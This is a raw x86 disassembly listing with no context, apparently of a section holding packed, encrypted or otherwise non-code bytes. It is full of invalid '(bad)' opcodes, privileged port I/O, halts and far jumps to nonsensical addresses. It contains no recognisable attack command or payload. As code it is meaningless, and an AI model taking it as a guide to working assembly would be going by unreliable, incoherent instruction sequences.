  402260:	sub    dh,bh
  402262:	mov    ds:0x735c00d0,al
  402267:	imul   edx,DWORD PTR [edx-0x47],0xffffffdd
  40226b:	aaa    
  40226c:	popa   
  40226d:	lahf   
  40226e:	jecxz  0x4022a4
  402270:	add    eax,0x1e40c881
  402275:	call   0xb04b:0x10218953
  40227c:	lahf   
  40227d:	rcl    DWORD PTR [eax],1
  40227f:	push   0x9f20e343
  402284:	dec    esi
  402285:	in     eax,dx
  402286:	lea    edi,[edi-0x35e9b7c0]
  40228c:	pushf  
  40228d:	jae    0x4022e0
  40228f:	fnstenv [ebx-0x3]
  402292:	or     eax,ebp
  402294:	dec    eax
  402295:	fldenv [ebx+0x43b3d72f]
  40229b:	test   eax,0x314e5713
  4022a0:	xchg   cl,cl
  4022a2:	mov    esi,0xccd6db84
  4022a7:	pop    ds
  4022a8:	and    BYTE PTR [eax-0x47],dh
  4022ab:	and    bh,BYTE PTR [esp+ecx*1]
  4022ae:	shr    bl,cl
  4022b0:	dec    edi
  4022b1:	rcl    BYTE PTR [ecx],cl
  4022b3:	outs   dx,BYTE PTR ds:[esi]
  4022b4:	sbb    ah,BYTE PTR [eax-0x1b03400]
  4022ba:	inc    eax
  4022bb:	test   DWORD PTR [eax-0x34],esi
  4022be:	xchg   eax,edx
  4022c0:	add    ah,BYTE PTR [ebp+0x76]
  4022c3:	inc    ebp
  4022c4:	pusha  
  4022c5:	int    0xba
  4022c7:	inc    edi
  4022c8:	xchg   DWORD PTR [ebx+0x70],eax
  4022cb:	mov    edx,0x502ea47f
  4022d0:	xor    BYTE PTR [ecx-0x4f],cl
  4022d3:	ja     0x4022d3
  4022d5:	xor    BYTE PTR [ecx+eax*2],al
  4022d8:	inc    DWORD PTR [edi+0x2a783041]
  4022de:	sbb    esp,DWORD PTR [edx+0x4]
  4022e1:	dec    esp
  4022e2:	hlt    
  4022e3:	aaa    
  4022e4:	scas   al,BYTE PTR es:[edi]
  4022e5:	hlt    
  4022e6:	xchg   BYTE PTR [ebx],cl
  4022e8:	div    edx
  4022ea:	jg     0x402347
  4022ec:	dec    ebp
  4022ed:	mov    dl,0xd3
  4022ef:	(bad)  
  4022f0:	mov    edx,0x735492ef
  4022f5:	jb     0x402334
  4022f7:	adc    DWORD PTR [ebx+0x2950a9a3],ecx
  4022fd:	push   esp
  4022fe:	dec    edi
  4022ff:	jnp    0x40234a
  402301:	pop    ecx
  402302:	outs   dx,DWORD PTR ds:[esi]
  402303:	jp     0x40229f
  402305:	push   ebp
  402306:	pusha  
  402307:	pop    ebx
  402308:	fld    TBYTE PTR [esi]
  40230a:	cmp    al,0x51
  40230c:	adc    DWORD PTR [eax+0x7d86f4c3],ebp
  402312:	cmp    al,BYTE PTR [ebx*8-0x46dde79f]
  402319:	cmp    DWORD PTR [edx+edi*2-0x4461845c],0x11
  402321:	pop    ebp
  402322:	add    DWORD PTR [eax*2-0x496f77bd],ecx
  402329:	xchg   ebp,eax
  40232a:	or     dl,al
  40232c:	inc    ebp
  40232d:	inc    ebp
  40232e:	mov    edx,0x19f16ca7
  402333:	cmp    ebp,ebp
  402335:	int    0xab
  402337:	inc    edi
  402338:	adc    eax,0xca607fd
  40233d:	cli    
  40233e:	mov    ebx,0x75d8b9dc
  402343:	or     al,0x9
  402345:	loope  0x4022c8
  402347:	les    ebp,FWORD PTR [eax]
  402349:	fsub   st(6),st
  40234b:	lock rep stos DWORD PTR es:[edi],eax
  40234e:	ds push es
  402350:	cmp    eax,0x8a9b92ef
  402355:	pop    edx
  402356:	scas   al,BYTE PTR es:[edi]
  402357:	fsub   st,st(5)
  402359:	xor    eax,DWORD PTR [edi+eax*4-0x45]
  40235d:	dec    edi
  40235e:	mov    al,0x6f
  402360:	pushf  
  402361:	add    eax,0x15b43144
  402366:	into   
  402367:	mov    bh,0x6a
  402369:	scas   al,BYTE PTR es:[edi]
  40236a:	out    0x44,al
  40236c:	cdq    
  40236d:	push   0x14
  40236f:	aas    
  402370:	bswap  edx
  402372:	out    0xbd,al
  402374:	mov    ebp,0x2974b957
  402379:	inc    edi
  40237a:	pop    ss
  40237b:	test   DWORD PTR [edi+ebp*8-0x59],eax
  40237f:	pusha  
  402380:	xchg   esi,eax
  402381:	add    eax,0x21d764e4
  402386:	xchg   esi,eax
  402387:	adc    al,0x3a
  402389:	inc    bx
  40238b:	push   cs
  40238c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40238d:	gs jo  0x40231a
  402390:	fiadd  DWORD PTR ds:[ecx-0x1f]
  402394:	std    
  402395:	pushf  
  402396:	jge    0x40239d
  402398:	push   ss
  402399:	sub    BYTE PTR [ecx],dl
  40239b:	mov    DWORD PTR [ebp-0x3c1f5bd7],ebp
  4023a1:	add    bl,0x8b
  4023a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023a5:	popf   
  4023a6:	ins    BYTE PTR es:[edi],dx
  4023a7:	mov    gs,WORD PTR [edx+0x90e1799]
  4023ad:	jl     0x402400
  4023af:	push   ds
  4023b0:	push   ss
  4023b1:	in     al,0xcc
  4023b3:	cwde   
  4023b4:	dec    ebx
  4023b5:	(bad)  
  4023b6:	mov    bl,0x87
  4023b8:	mov    bl,0x4e
  4023ba:	fptan  
  4023bc:	loope  0x4023b0
  4023be:	sub    BYTE PTR [ecx],bh
  4023c0:	adc    esi,ebp
  4023c2:	cs xor esi,ecx
  4023c5:	pop    esp
  4023c6:	or     dl,bl
  4023c8:	ss ja  0x4023b6
  4023cb:	pushf  
  4023cc:	xchg   edi,eax
  4023cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023ce:	stos   BYTE PTR es:[edi],al
  4023cf:	pop    ebp
  4023d0:	pushf  
  4023d1:	(bad)  [edx+0x65f8d73e]
  4023d7:	cli    
  4023d8:	(bad)  
  4023d9:	inc    DWORD PTR [esi-0x54222ad9]
  4023df:	or     dh,BYTE PTR [edx]
  4023e1:	mov    ch,0x69
  4023e3:	ficomp WORD PTR [edi+0x0]
  4023e6:	xchg   edi,eax
  4023e7:	push   0xffffff9a
  4023e9:	(bad)  [ebp+eax*8+0x2bc33017]
  4023f0:	pushf  
  4023f1:	jp     0x40245d
  4023f3:	imul   ch
  4023f5:	mov    ebx,0x413b1e85
  4023fa:	pop    ebp
  4023fb:	push   ebx
  4023fc:	(bad)  
  4023fe:	cmp    cl,al
  402400:	sahf   
  402401:	push   ebx
  402402:	shr    BYTE PTR [ebx+0x2240d99f],0xcc
  402409:	pop    edi
  40240a:	pcmpeqb xmm3,XMMWORD PTR [ebp-0xe930f05]
  402412:	jp     0x4023c5
  402414:	add    DWORD PTR [ebx-0x5f3ec537],ebx
  40241a:	cmc    
  40241b:	mov    ebp,0x41492564
  402420:	cmp    cl,al
  402422:	jmp    FWORD PTR ds:0x6f6db166
  402428:	jecxz  0x4023dc
  40242a:	mov    al,ds:0x72b594e6
  40242f:	mov    ch,0x1d
  402431:	mov    BYTE PTR [edi-0x7126bbbd],ch
  402437:	push   0x11921015
  40243c:	cmp    bl,BYTE PTR [ecx]
  40243e:	jae    0x402469
  402440:	sub    DWORD PTR [edi],0x4a83d2d8
  402446:	in     eax,0xed
  402448:	out    0x85,eax
  40244a:	int3   
  40244b:	add    eax,0x813dfdf5
  402450:	les    eax,FWORD PTR [ebx]
  402452:	pop    ebp
  402453:	mov    esi,0x5f114843
  402458:	call   0x8686bc96
  40245d:	mov    ds:0x40a1b7f1,al
  402462:	jle    0x402440
  402464:	mov    ebx,0x83d4a3d8
  402469:	fwait
  40246a:	shl    BYTE PTR [ebp-0x37],cl
  40246d:	sub    ebp,DWORD PTR [esi+ecx*4]
  402470:	and    eax,0x638700ff
  402475:	push   0xfeec8687
  40247a:	pop    eax
  40247b:	sbb    edi,DWORD PTR [eax]
  40247d:	adc    eax,0xf266066f
  402482:	fnsave [ecx+0x66]
  402485:	adc    ch,ah
  402487:	push   ss
  402488:	lods   eax,DWORD PTR ds:[esi]
  402489:	int3   
  40248a:	pop    ss
  40248b:	adc    DWORD PTR [esi+0x67c8f06f],esp
  402491:	dec    eax
  402492:	and    DWORD PTR [eax+0x0],esp
  402495:	shl    cl,0xb8
  402498:	rcr    BYTE PTR [esi-0x50],0x4
  40249c:	mov    ah,ah
  40249e:	test   al,0xa8
  4024a0:	ficomp WORD PTR [eax]
  4024a2:	(bad)  
  4024a4:	nop
  4024a5:	cs sub dh,dl
  4024a8:	or     al,0x94
  4024aa:	outs   dx,BYTE PTR ds:[esi]
  4024ab:	loopne 0x40251b
  4024ad:	push   esi
  4024ae:	xchg   esp,eax
  4024af:	in     eax,0x74
  4024b1:	or     dl,dl
  4024b3:	push   edi
  4024b4:	adc    eax,0xfeec2f3c
  4024b9:	jno    0x4024bc
  4024bb:	fs jp  0x4024dc
  4024be:	lea    ebx,[esi-0x61]
  4024c1:	mov    esp,esp
  4024c3:	nop
  4024c4:	pop    edx
  4024c5:	sahf   
  4024c6:	jmp    0xe35c619c
  4024cb:	xchg   edx,eax
  4024cc:	out    0x79,al
  4024ce:	fild   WORD PTR [esi+0x9]
  4024d1:	iret   
  4024d2:	sub    bl,BYTE PTR [edi]
  4024d4:	fcomi  st,st(0)
  4024d6:	ja     0x40253d
  4024d8:	mov    eax,0xe408c0b0
  4024dd:	mov    edx,0xee03f782
  4024e2:	push   ebx
  4024e3:	das    
  4024e4:	push   cs
  4024e5:	pop    edx
  4024e6:	jae    0x402565
  4024e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024e9:	call   0x40e4f42a
  4024ee:	aad    0x9c
  4024f0:	cmp    BYTE PTR [eax],ch
  4024f2:	daa    
  4024f3:	test   edx,ebx
  4024f5:	or     BYTE PTR [ebp-0x304568f4],0x15
  4024fc:	inc    esp
  4024fd:	icebp  
  4024fe:	xor    DWORD PTR [ecx+0x1566f0ec],ebx
  402504:	sbb    eax,0xd6ea62b
  402509:	inc    edx
  40250a:	jne    0x4024d2
  40250c:	ret    
  40250d:	mov    eax,0xebea3a6f
  402512:	lock or BYTE PTR [edi+ebx*4],ah
  402516:	daa    
  402517:	call   FWORD PTR [edi-0x7d]
  40251a:	mov    ds:0x4e8c39ef,eax
  40251f:	(bad)
  402522:	cs xchg cx,ax
  402525:	sbb    BYTE PTR [edi],dh
  402527:	rol    DWORD PTR [eax],1
  402529:	lods   al,BYTE PTR ds:[esi]
  40252a:	jmp    0x3d3e:0x9f374877
  402531:	dec    esi
  402532:	xor    ebx,DWORD PTR [edi+0x4a]
  402535:	ror    BYTE PTR [ebx+ebx*2],1
  402538:	js     0x4024fa
  40253a:	div    DWORD PTR [edx-0x66213573]
  402540:	adc    al,0x80
  402542:	cmc    
  402543:	adc    ebx,DWORD PTR [esi+0x69]
  402546:	cld    
  402547:	push   ss
  402548:	mov    dh,0xca
  40254a:	hlt    
  40254b:	(bad)  
  40254c:	pop    eax
  40254d:	push   esp
  40254e:	inc    esp
  40254f:	sub    al,0x8e
  402551:	pop    ss
  402552:	pop    es
  402553:	shr    DWORD PTR [edx-0x2f585192],cl
  402559:	cmp    ah,dl
  40255b:	jecxz  0x4025b6
  40255d:	std    
  40255e:	pop    ds
  40255f:	dec    ecx
  402560:	das    
  402561:	jbe    0x40255c
  402563:	mov    ds:0x476780cf,al
  402568:	sar    BYTE PTR cs:[eax+0x69],cl
  40256c:	and    dh,BYTE PTR [edi+0x42]
  40256f:	or     eax,0xed91d386
  402574:	aas    
  402575:	js     0x402507
  402577:	add    BYTE PTR [edi],al
  402579:	fbld   TBYTE PTR [ebx-0x71a397b7]
  40257f:	cs mov ecx,0x4ee4e3d8
  402585:	shl    DWORD PTR [ebx-0x4c19c36f],0x95
  40258c:	ja     0x402585
  40258e:	fdiv   st(1),st
  402590:	push   cs
  402591:	xchg   edx,eax
  402592:	enter  0xf776,0x37
  402596:	add    eax,0xa681ae49
  40259b:	mov    cl,BYTE PTR [edi+0x1e9da60d]
  4025a1:	icebp  
  4025a2:	mov    ecx,0xe2d99ddc
  4025a7:	in     al,0xe0
  4025a9:	mov    ebp,0x249cdb49
  4025ae:	in     eax,0x24
  4025b0:	nop
  4025b1:	mov    esp,0xcdea4603
  4025b6:	push   dx
  4025b8:	xchg   esp,eax
  4025b9:	cmp    al,0x52
  4025bb:	loopne 0x4025c7
  4025bd:	cmp    dh,BYTE PTR [ebp-0x6aaacf1]
  4025c3:	add    BYTE PTR [eax-0xb],bl
  4025c6:	xchg   edi,eax
  4025c7:	jle    0x40259e
  4025c9:	xchg   ebx,eax
  4025ca:	cmc    
  4025cb:	mov    eax,0x1fe2d9d8
  4025d0:	mov    ebp,0xdffc2b32
  4025d5:	outs   dx,DWORD PTR ds:[esi]
  4025d6:	(bad)  
  4025d8:	mov    ch,bl
  4025da:	sbb    BYTE PTR [ebx-0x2e],0xd5
  4025de:	fistp  WORD PTR [esi]
  4025e0:	cmp    DWORD PTR [ebx-0x14258279],edx
  4025e6:	adc    BYTE PTR ds:0xc6a09be,dh
  4025ec:	ins    DWORD PTR es:[edi],dx
  4025ed:	cmp    eax,0x97226f57
  4025f2:	aam    0x30
  4025f4:	nop
  4025f5:	sbb    eax,0x88767264
  4025fa:	pusha  
  4025fb:	leave  
  4025fc:	mov    ah,0x48
  4025fe:	iret   
  4025ff:	or     DWORD PTR [edx-0x5],esi
  402602:	fist   WORD PTR [edx-0x5b33b322]
  402608:	jge    0x4025f8
  40260a:	int    0xe3
  40260c:	aam    0x97
  40260e:	adc    ah,ch
  402610:	clc    
  402611:	jbe    0x402663
  402613:	cli    
  402614:	fs inc ebp
  402616:	hlt    
  402617:	jns    0x4025d5
  402619:	retf   
  40261a:	xchg   DWORD PTR [ebx-0x68],eax
  40261d:	scas   al,BYTE PTR es:[edi]
  40261e:	mov    esp,0x437035e9
  402623:	icebp  
  402624:	add    BYTE PTR ds:0xf0c1c6e1,al
  40262a:	dec    eax
  40262b:	not    BYTE PTR [edx]
  40262d:	in     al,0xb2
  40262f:	or     eax,0x6ec34ffc
  402634:	iret   
  402635:	mov    dl,BYTE PTR [edx-0x38b19d8c]
  40263b:	xor    al,0x2e
  40263d:	mov    dl,0xe3
  40263f:	pop    ds
  402640:	cmp    ecx,edx
  402642:	(bad)  
  402646:	aas    
  402647:	push   ebx
  402648:	pusha  
  402649:	and    ebp,esi
  40264b:	arpl   bx,sp
  40264d:	push   ebp
  40264e:	in     eax,0xf0
  402650:	mov    cs,WORD PTR [ecx+0x1c]
  402653:	jle    0x402625
  402655:	push   0xb2cd68c0
  40265a:	fimul  DWORD PTR [ebx-0x61]
  40265d:	fld    TBYTE PTR [ebp+0x5f63de3c]
  402663:	xor    esp,ecx
  402665:	xchg   esi,esp
  402667:	or     bl,BYTE PTR ss:[edx+0x1b]
  40266b:	pusha  
  40266c:	and    cl,BYTE PTR [esp+ecx*1-0x1d]
  402670:	add    eax,0x1ef87e6c
  402675:	sbb    ah,BYTE PTR [edi+eiz*4-0xbf0d1d4]
  40267c:	loope  0x4026bd
  40267e:	or     eax,0x215c221a
  402683:	adc    al,0x84
  402685:	sbb    ah,BYTE PTR [esi+0x42d1f93d]
  40268b:	hlt    
  40268c:	rcr    DWORD PTR [edi],cl
  40268e:	call   0xc46a7d42
  402693:	test   DWORD PTR [ecx],esi
  402695:	or     BYTE PTR [edx],ah
  402697:	mov    eax,0x52462948
  40269c:	cli    
  40269d:	(bad)
  4026a0:	call   0x63fe:0xebe67836
  4026a7:	push   esp
  4026a8:	int3   
  4026a9:	out    0xe8,al
  4026ab:	xchg   edx,eax
  4026ac:	mov    DWORD PTR [ecx+0x58],ebp
  4026af:	dec    BYTE PTR [esi+ecx*4-0x494e293d]
  4026b6:	in     al,dx
  4026b7:	pop    esp
  4026b8:	cmp    ebx,ebp
  4026ba:	aam    0xdc
  4026bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026bd:	mov    edx,0x591cb6cd
  4026c2:	jo     0x4026df
  4026c4:	cmc    
  4026c5:	cs dec eax
  4026c7:	inc    eax
  4026c8:	daa    
  4026c9:	mov    al,0x2
  4026cb:	not    ebp
  4026cd:	inc    edx
  4026ce:	rol    BYTE PTR [edx],cl
  4026d0:	inc    ebx
  4026d1:	and    DWORD PTR ds:0xea834809,0x65e8f9fc
  4026db:	loopne 0x4026c5
  4026dd:	sub    al,0x25
  4026df:	jmp    0x3bd0:0x249439e4
  4026e6:	gs mov esp,ebx
  4026e9:	inc    edi
  4026ea:	sub    eax,0x5537ebc5
  4026ef:	lea    edx,[ebx]
  4026f1:	pop    esi
  4026f2:	xor    eax,0x69f3a95c
  4026f7:	lea    ebp,[ecx+eax*1-0x6d]
  4026fb:	aaa    
  4026fc:	xlat   BYTE PTR ds:[ebx]
  4026fd:	sahf   
  4026fe:	fidiv  DWORD PTR [edx-0x50d99cb3]
  402704:	lock or esp,ebp
  402707:	sub    al,0x67
  402709:	pop    ss
  40270a:	hlt    
  40270b:	or     eax,0x9b9ec1f6
  402710:	jmp    0xd85d:0xf52615eb
  402717:	fimul  WORD PTR ds:0x14384bd1
  40271d:	mov    dh,0x99
  40271f:	hlt    
  402720:	jbe    0x402785
  402722:	push   ss
  402723:	xor    eax,0xaee7ed2b
  402728:	lock popf 
  40272a:	imul   edx,DWORD PTR [edx+0x62],0xffffffad
  40272e:	pusha  
  40272f:	inc    eax
  402730:	scas   al,BYTE PTR es:[edi]
  402731:	and    cl,al
  402733:	pop    eax
  402734:	mov    ds:0x18953cd8,al
  402739:	lahf   
  40273a:	imul   ebx,DWORD PTR [ebp+0x73],0x3
  40273e:	cmp    al,0x8b
  402740:	cwde   
  402741:	outs   dx,DWORD PTR ds:[esi]
  402742:	cwde   
  402743:	repz clc 
  402745:	(bad)  
  402746:	xor    BYTE PTR [edi-0x68],dl
  402749:	or     DWORD PTR [ebx+ebp*8],edx
  40274c:	(bad)  
  40274d:	rol    BYTE PTR [ebp+0x41],1
  402750:	ins    BYTE PTR es:[edi],dx
  402751:	mov    eax,ds:0x34ce337f
  402756:	shr    DWORD PTR [ecx-0x23],0xda
  40275a:	js     0x402785
  40275c:	push   ds
  40275d:	push   esi
  40275e:	xor    al,BYTE PTR [edx]
  402760:	pop    esp
  402761:	pop    ebp
  402762:	sbb    ch,bl
  402764:	jbe    0x4026eb
  402766:	ins    DWORD PTR es:[edi],dx
  402767:	ss dec edi
  402769:	mov    ecx,0x588abd77
  40276e:	sub    DWORD PTR [esi+0x47615190],ebx
  402774:	(bad)  
  402775:	cwde   
  402776:	popa   
  402777:	inc    ebx
  402778:	dec    ebx
  402779:	jge    0x4027e9
  40277b:	ins    BYTE PTR es:[edi],dx
  40277c:	jnp    0x40271f
  40277e:	dec    esp
  40277f:	ficom  WORD PTR [ebx+0x2b3740d]
  402785:	ins    DWORD PTR es:[edi],dx
  402786:	mov    bl,0xc0
  402788:	mov    esi,0xcc440b4e
  40278d:	pop    ds
  40278e:	adc    al,0x6c
  402790:	dec    ebx
  402791:	mov    eax,0xd0c6ca04
  402796:	dec    ebx
  402797:	and    eax,0xf015de5b
  40279c:	inc    edx
  40279d:	xchg   ecx,eax
  40279e:	jecxz  0x4027a2
  4027a0:	mov    edx,0x4bf0723f
  4027a5:	xor    al,0xcd
  4027a7:	mov    BYTE PTR [ebx],cl
  4027a9:	jl     0x402759
  4027ab:	enter  0x6706,0x9a
  4027af:	xlat   BYTE PTR ds:[ebx]
  4027b0:	xchg   ebp,eax
  4027b1:	jl     0x4027a3
  4027b3:	out    0x87,eax
  4027b5:	and    DWORD PTR [ebp+0x26],edx
  4027b8:	cmp    al,0x1b
  4027ba:	push   ebx
  4027bb:	xor    ah,BYTE PTR [edx+0x240db298]
  4027c1:	loop   0x402804
  4027c3:	arpl   WORD PTR [esi],cx
  4027c5:	add    ch,ah
  4027c7:	or     BYTE PTR [ecx+ecx*4],0x43
  4027cb:	mov    dh,0x4f
  4027cd:	push   ebp
  4027ce:	add    bh,ch
  4027d0:	push   edi
  4027d1:	jbe    0x402825
  4027d3:	in     eax,dx
  4027d4:	cwde   
  4027d5:	adc    ch,ah
  4027d7:	shl    BYTE PTR [eax+0xd51fc47],cl
  4027dd:	mov    al,0x9f
  4027df:	(bad)  
  4027e0:	ficom  DWORD PTR [eax]
  4027e2:	sbb    DWORD PTR [ebx-0x15ff03b6],eax
  4027e8:	and    eax,0xe3e857e
  4027ed:	xchg   ebx,eax
  4027ee:	(bad)  
  4027ef:	pop    edi
  4027f0:	pop    ebp
  4027f1:	mov    edi,0xdd5d733f
  4027f6:	pop    ebx
  4027f7:	and    BYTE PTR [edx+0x6d1092dd],0x6a
  4027fe:	stc    
  4027ff:	int3   
  402800:	aam    0xe7
  402802:	mov    ebp,ebx
  402804:	call   0x1b1d3ed7
  402809:	pop    eax
  40280a:	loope  0x4027d2
  40280c:	adc    eax,0x5883929b
  402811:	xor    esi,esp
  402813:	push   ds
  402814:	add    BYTE PTR [ebx],bl
  402816:	mov    ebx,0x931c7335
  40281b:	xor    edx,DWORD PTR [eax+0x608645d5]
  402821:	ss fdivrp st(1),st
  402824:	pop    ss
  402825:	sub    eax,0x7b3bc04
  40282a:	xor    DWORD PTR [edx-0x4e16e71c],ebp
  402830:	scas   eax,DWORD PTR es:[edi]
  402831:	stos   BYTE PTR es:[edi],al
  402832:	sub    BYTE PTR [ecx+0x46],dh
  402835:	mov    WORD PTR [esi+0x358cfab2],es
  40283b:	dec    ecx
  40283c:	xor    dh,BYTE PTR [edi+0x26]
  40283f:	cmc    
  402840:	dec    eax
  402841:	dec    edx
  402842:	rcr    DWORD PTR [eax-0x1f],cl
  402845:	cmp    DWORD PTR [edx-0x6124e6d0],edx
  40284b:	jo     0x402819
  40284d:	adc    eax,0x8ac48fa7
  402852:	jl     0x402880
  402854:	xchg   esi,eax
  402855:	shr    BYTE PTR [eax+0x6ae71aea],1
  40285b:	mov    ch,0x33
  40285d:	gs ss jns 0x4027f0
  402861:	jno    0x4027f6
  402863:	push   ds
  402864:	rcr    BYTE PTR [esi+0x33c74b14],1
  40286a:	cmp    cl,ch
  40286c:	cld    
  40286d:	mov    ch,0xd1
  40286f:	jmp    0xb3bd83d2
  402874:	mov    esp,0x1c41e836
  402879:	adc    al,0x35
  40287b:	stos   BYTE PTR es:[edi],al
  40287c:	inc    ebx
  40287d:	mov    ah,0xab
  40287f:	mov    ebp,0x2e96317b
  402884:	jle    0x4028f7
  402886:	scas   al,BYTE PTR es:[edi]
  402887:	(bad)
  40288b:	aaa    
  40288c:	push   0xd18edd78
  402891:	adc    al,0x3
  402893:	je     0x4028ff
  402895:	sbb    dh,BYTE PTR [edx]
  402897:	inc    edx
  402898:	mov    eax,ds:0x6727af6f
  40289d:	mov    ah,0xd4
  40289f:	and    ebx,DWORD PTR [ebp+0x3de3354e]
  4028a5:	mov    eax,0x8a694272
  4028aa:	pop    esi
  4028ab:	std    
  4028ac:	cwde   
  4028ad:	mov    dh,0x9
  4028af:	test   eax,0x65bad99f
  4028b4:	jecxz  0x402915
  4028b6:	sbb    eax,0x92f88846
  4028bb:	nop
  4028bc:	mov    ds:0x53fc14a6,eax
  4028c1:	push   ebx
  4028c2:	sbb    BYTE PTR [esi+0x4d],bl
  4028c5:	cmp    eax,0xb0053bc0
  4028ca:	xchg   esp,eax
  4028cb:	and    edx,ebp
  4028cd:	(bad)  
  4028ce:	scas   eax,DWORD PTR es:[edi]
  4028cf:	jle    0x402941
  4028d1:	push   ebx
  4028d2:	sub    al,0x27
  4028d4:	ja     0x4028f7
  4028d6:	sbb    al,0x49
  4028d8:	or     DWORD PTR ds:0xad479060,ebx
  4028de:	stos   DWORD PTR es:[edi],eax
  4028df:	mov    dl,0x63
  4028e1:	sar    bl,0xbc
  4028e4:	mov    cl,0xc3
  4028e6:	js     0x402872
  4028e8:	push   edi
  4028e9:	mov    dh,0x11
  4028eb:	ud0    ebx,DWORD PTR [edx-0x16c02b9c]
  4028f2:	scas   eax,DWORD PTR es:[edi]
  4028f3:	leave  
  4028f4:	repnz popa 
  4028f6:	inc    ebp
  4028f7:	shr    BYTE PTR [ecx],0x21
  4028fa:	push   ds
  4028fb:	ret    0x4fd1
  4028fe:	xor    eax,0x54143693
  402903:	mov    ch,0x4a
  402905:	and    eax,0x66acee4a
  40290a:	mov    ds:0xaf63ed2b,al
  40290f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402910:	cmc    
  402911:	xchg   dh,bh
  402913:	lods   eax,DWORD PTR ds:[esi]
  402914:	in     al,0x41
  402916:	out    dx,al
  402917:	sahf   
  402918:	out    dx,eax
  402919:	pusha  
  40291a:	mov    DWORD PTR [eax-0x282a8ba3],ebx
  402920:	cmc    
  402921:	scas   eax,DWORD PTR es:[edi]
  402922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402923:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402924:	dec    ebx
  402925:	(bad)  
  402926:	and    al,0x7
  402928:	push   ebp
  402929:	out    0xb0,al
  40292b:	pop    ecx
  40292c:	add    DWORD PTR ds:0x2cca3677,esp
  402932:	xchg   esi,eax
  402933:	sub    dh,al
  402935:	mov    eax,ds:0xa6739529
  40293a:	pop    esi
  40293b:	sub    al,0x74
  40293d:	retf   
  40293e:	mov    al,ds:0x2b7d97d2
  402943:	inc    ebx
  402944:	push   esi
  402945:	jp     0x402960
  402947:	out    dx,eax
  402948:	or     eax,0xc2bb718b
  40294d:	add    al,0x68
  40294f:	pop    esi
  402950:	mov    dh,0x5e
  402952:	xor    edi,DWORD PTR [eax+esi*1]
  402955:	pop    es
  402956:	aas    
  402957:	jne    0x402988
  402959:	loope  0x402979
  40295b:	iret   
  40295c:	imul   ebx,edi,0x53a895e6
  402962:	push   0x5ac0509c
  402967:	in     eax,0x82
  402969:	bound  esp,QWORD PTR [ebx]
  40296b:	pop    ds
  40296c:	sub    BYTE PTR [ecx+edx*4-0x12225d90],ch
  402973:	xchg   esi,eax
  402974:	add    al,0x46
  402977:	jmp    0x6e84:0x671aa303
  40297e:	es ins BYTE PTR es:[edi],dx
  402980:	adc    BYTE PTR [esi-0x2e],cl
  402983:	add    eax,0xa7d82a7e
  402989:	or     al,0x3d
  40298b:	push   ds
  40298c:	push   edx
  40298d:	and    al,0xd0
  40298f:	pop    esi
  402990:	loopne 0x402a10
  402992:	mov    edi,0xb24d7857
  402997:	fist   DWORD PTR [ebp+0x135f6055]
  40299d:	fdivr  st(6),st
  40299f:	cli    
  4029a0:	and    al,0x58
  4029a2:	adc    ecx,DWORD PTR [ecx-0x28]
  4029a5:	jmp    0x402953
  4029a7:	xor    BYTE PTR [ebp-0x65],dl
  4029aa:	test   eax,0x1efc609
  4029af:	inc    ecx
  4029b0:	out    0xd3,al
  4029b2:	jecxz  0x402938
  4029b4:	and    cl,BYTE PTR [ecx+ecx*2-0xf32839f]
  4029bb:	cs ss push ebx
  4029be:	cmc    
  4029bf:	ja     0x402963
  4029c1:	(bad)  [edx+0x18]
  4029c4:	xchg   esp,eax
  4029c5:	lds    ecx,FWORD PTR [ebx+0x1a]
  4029c8:	lahf   
  4029c9:	lods   eax,DWORD PTR es:[esi]
  4029cb:	or     ah,BYTE PTR [edi+ecx*4]
  4029ce:	xchg   ebx,eax
  4029cf:	add    BYTE PTR [ebx+ebp*4-0x29],0xcb
  4029d4:	cwde   
  4029d5:	mov    ebx,0xe0d733f9
  4029da:	adc    BYTE PTR [edx],bl
  4029dc:	mov    cl,0x68
  4029de:	adc    eax,0xafa486c0
  4029e3:	call   0x7c7:0x1a417894
  4029ea:	or     DWORD PTR [edx-0x6e],edi
  4029ed:	mov    bl,0x7d
  4029ef:	sub    dl,BYTE PTR [edi]
  4029f1:	inc    ecx
  4029f2:	imul   edi,DWORD PTR [esi*2-0x16311dd9],0x4977c296
  4029fd:	rcl    DWORD PTR [ebp-0x6baa9d2b],cl
  402a03:	sbb    DWORD PTR [ecx],esi
  402a05:	out    0x81,eax
  402a07:	out    0xef,eax
  402a09:	jmp    0x402a1a
  402a0b:	xor    al,0x4b
  402a0d:	mov    edi,0xc8161197
  402a12:	test   al,0x90
  402a14:	(bad)  
  402a15:	mov    ds:0xdede9877,al
  402a1a:	xchg   DWORD PTR [ebp-0x6e],ecx
  402a1d:	test   DWORD PTR [edi+0x41],0xff1c5dfe
  402a24:	shl    BYTE PTR [ebp+0x5ff513f3],cl
  402a2a:	scas   al,BYTE PTR es:[edi]
  402a2b:	div    DWORD PTR [ecx+0x23]
  402a2e:	shl    DWORD PTR [ebx],cl
  402a30:	or     al,0x41
  402a32:	nop
  402a33:	ds jge 0x402a02
  402a36:	sti    
  402a37:	fsub   QWORD PTR [esi+0x3d121fad]
  402a3d:	(bad)  
  402a3e:	in     al,dx
  402a3f:	(bad)  
  402a40:	cmp    BYTE PTR [ebx-0x5643b694],ah
  402a46:	or     ah,BYTE PTR [edx-0x4b]
  402a49:	out    dx,eax
  402a4a:	out    dx,eax
  402a4b:	loopne 0x402ac4
  402a4d:	pop    es
  402a4e:	ja     0x402a60
  402a50:	inc    ebp
  402a51:	mov    gs,WORD PTR [edx+0x67870bd4]
  402a57:	add    BYTE PTR [edi-0x76],bl
  402a5a:	push   cs
  402a5b:	mov    bh,0x18
  402a5d:	xchg   ecx,eax
  402a5e:	hlt    
  402a5f:	sub    edx,DWORD PTR [eax+ecx*2]
  402a62:	push   0x11f651a2
  402a67:	(bad)  
  402a68:	outs   dx,DWORD PTR ds:[esi]
  402a69:	ds in  al,0xda
  402a6c:	dec    esi
  402a6d:	push   cs
  402a6e:	push   edi
  402a6f:	clc    
  402a70:	(bad)  
  402a71:	retf   
  402a72:	popf   
  402a73:	iret   
  402a74:	inc    ebx
  402a75:	repz add BYTE PTR [ebx+ebp*4],0xa6
